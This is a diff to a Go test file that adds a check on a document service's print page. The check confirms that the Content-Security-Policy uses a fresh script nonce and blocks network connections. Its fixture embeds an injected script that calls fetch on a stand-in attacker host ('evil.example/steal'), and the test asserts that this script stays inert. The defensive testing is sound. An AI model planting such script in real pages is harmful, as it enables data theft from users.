@@ -148,6 +148,43 @@ func TestRenderRouteReturnsWrapperNotRawHTML(t *testing.T) {
 	}
 }
 
+func TestPrintPageOnlyAllowsNonceBootstrap(t *testing.T) {
+	e := newConfiguredTestEnv(t, server.Config{Environment: "test", AppOrigin: "https://app.example", SessionSecret: "test-secret"})
+	docID, verID := e.createDocument("Doc", `<html><body><script>fetch('https://evil.example/steal')</script></body></html>`, fixtureOwner)
+	tokRR := do(t, e.h, http.MethodPost, "/v1/documents/"+docID+"/versions/"+verID+"/print-token", "", map[string]string{
+		"X-Test-Principal": principalHeader(fixtureOwner),
+	})
+	assertStatus(t, tokRR, http.StatusOK)
+	var tok struct {
+		URL string `json:"url"`
+	}
+	if err := json.Unmarshal(tokRR.Body.Bytes(), &tok); err != nil {
+		t.Fatal(err)
+	}
+
+	var previous string
+	for i := 0; i < 2; i++ {
+		rr := do(t, e.h, http.MethodGet, tok.URL, "", nil)
+		assertStatus(t, rr, http.StatusOK)
+		csp := rr.Header().Get("Content-Security-Policy")
+		if strings.Contains(csp, "'unsafe-inline' 'nonce-") || strings.Contains(csp, "script-src 'unsafe-inline'") || !strings.Contains(csp, "connect-src 'none'") {
+			t.Fatalf("unsafe print CSP: %q", csp)
+		}
+		start := strings.Index(csp, "script-src 'nonce-")
+		if start < 0 {
+			t.Fatalf("missing script nonce: %q", csp)
+		}
+		nonce := strings.SplitN(csp[start+len("script-src 'nonce-"):], "'", 2)[0]
+		if len(nonce) < 20 || nonce == previous {
+			t.Fatalf("invalid or reused nonce: %q", nonce)
+		}
+		if !strings.Contains(rr.Body.String(), `<script nonce="`+nonce+`" id="slashdocs-print-bootstrap">`) || !strings.Contains(rr.Body.String(), `<script>fetch('https://evil.example/steal')</script>`) {
+			t.Fatalf("print body missing nonce bootstrap or original content: %s", rr.Body.String())
+		}
+		previous = nonce
+	}
+}
+
 func TestRawHTMLDownloadIsServedInert(t *testing.T) {
 	e := newTestEnv(t)
 	docID, verID := e.createDocument("Doc", `<html><script>fetch('/v1/me')</script></html>`, fixtureOwner)
